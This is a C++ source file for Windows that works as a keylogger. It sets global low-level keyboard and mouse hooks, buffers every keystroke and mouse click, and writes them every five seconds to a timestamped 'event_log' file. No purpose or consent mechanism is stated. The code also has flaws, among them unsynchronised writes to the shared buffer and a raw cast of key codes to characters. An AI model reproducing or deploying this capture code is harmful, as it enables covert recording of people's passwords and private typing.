#include <iostream>
#include <fstream>
#include <Windows.h>
#include <chrono>
#include <thread>
#include <mutex>
#include <sstream>

const std::string filename = "event_log.txt";
std::string cycleFileName;
std::ofstream outputFile;
std::stringstream eventBuffer;
std::mutex bufferMutex;

void GenerateOutputFileName()
{
	SYSTEMTIME time;
	GetLocalTime(&time);
	std::string timestamp = std::to_string(time.wYear) + "-" +
		std::to_string(time.wMonth) + "-" +
		std::to_string(time.wDay) + "_" +
		std::to_string(time.wHour) + "-" +
		std::to_string(time.wMinute);

	cycleFileName = filename.substr(0, filename.find('.')) +
		"_" + timestamp + filename.substr(filename.find('.'));
}

// Low-level keyboard hook procedure
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		KBDLLHOOKSTRUCT* pKeyboardHookStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
		
		// Check the session ID of the event
		DWORD eventSessionId;
		ProcessIdToSessionId(GetCurrentProcessId(), &eventSessionId);

		// Get the current user's session ID
		DWORD currentSessionId = WTSGetActiveConsoleSessionId();

		if (eventSessionId == currentSessionId)
		{
			if (wParam == WM_KEYDOWN) {
				char key = static_cast<char>(pKeyboardHookStruct->vkCode);
				std::string event = "Key pressed: ";
				event += key;
				eventBuffer << event << std::endl;
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Low-level mouse hook procedure
LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		MSLLHOOKSTRUCT* pMouseHookStruct = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam);

		// Check the session ID of the event
		DWORD eventSessionId;
		ProcessIdToSessionId(GetCurrentProcessId(), &eventSessionId);

		// Get the current user's session ID
		DWORD currentSessionId = WTSGetActiveConsoleSessionId();

		if (eventSessionId == currentSessionId)
		{
			if (wParam == WM_LBUTTONDOWN) {
				eventBuffer << "Left mouse button clicked" << std::endl;
			}
			else if (wParam == WM_RBUTTONDOWN) {
				eventBuffer << "Right mouse button clicked" << std::endl;
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CaptureEvents() {
	// Get the current user's session ID
	DWORD currentSessionId = WTSGetActiveConsoleSessionId();

	// Set up the hook procedure
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
	if (!keyboardHook) {
		std::cerr << "Failed to set up keyboard hook" << std::endl;
		return;
	}

	// Set up the mouse hook
	HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
	if (!mouseHook) {
		std::cerr << "Failed to set up mouse hook" << std::endl;
		UnhookWindowsHookEx(keyboardHook);
		return;
	}

	// Enter message loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Clean up the hook
	UnhookWindowsHookEx(keyboardHook);
	UnhookWindowsHookEx(mouseHook);
}

void FlushToFile() {
	GenerateOutputFileName();

	while (true) {
		// Acquire lock on buffer mutex
		std::lock_guard<std::mutex> lock(bufferMutex);

		// Open the output file in append mode
		std::ofstream file(cycleFileName, std::ios::app);
		if (file.is_open()) {
			// Write event buffer contents to file
			file << eventBuffer.str();
			file.close();

			// Clear the event buffer
			eventBuffer.str(std::string());
			eventBuffer.clear();

			std::cout << "Event data flushed to file." << std::endl;
		}
		else {
			std::cerr << "Failed to open file: " << cycleFileName << std::endl;
		}

		// Sleep for 5 seconds
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

int main() {
	// Create and detach the thread for capturing events
	std::thread eventThread(CaptureEvents);
	eventThread.detach();

	// Create and detach the thread for flushing to file
	std::thread flushThread(FlushToFile);
	flushThread.detach();

	while (1);

	return 0;
}